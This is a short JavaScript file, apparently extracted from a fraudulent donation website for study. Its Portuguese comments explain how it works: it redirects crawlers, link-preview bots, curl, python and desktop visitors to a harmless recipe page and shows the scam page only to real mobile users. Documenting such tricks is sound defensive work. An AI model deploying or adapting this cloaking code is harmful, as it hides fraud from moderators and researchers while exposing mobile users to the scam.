// cloaking.js — Código de cloaking extraído de doacao-solidaria.online/Helo/
// Este script roda ANTES de tudo e decide se mostra a página real ou redireciona

(function(){
  // Destino do cloak (página inocente)
  var w = "https://www.tudogostoso.com.br/receita/91534-bolo-comum.html";

  var u = navigator.userAgent.toLowerCase();
  
  // Lista de bots/crawlers para bloquear
  var b = [
    "facebook", "crawler", "bot", "spider", "meta", 
    "preview", "whatsapp", "telegram", "curl", "python"
  ];
  
  // Detecta se NÃO é mobile
  var d = !/android|iphone|ipad|mobile/i.test(u);
  
  // Detecta se é bot
  var f = b.some(function(x){ return u.indexOf(x) !== -1 });
  
  // Se for bot OU desktop → redireciona para TudoGostoso
  if (f || d) {
    window.location.href = w;
  }
  // Se for mobile real → mostra a página de golpe normalmente
})();
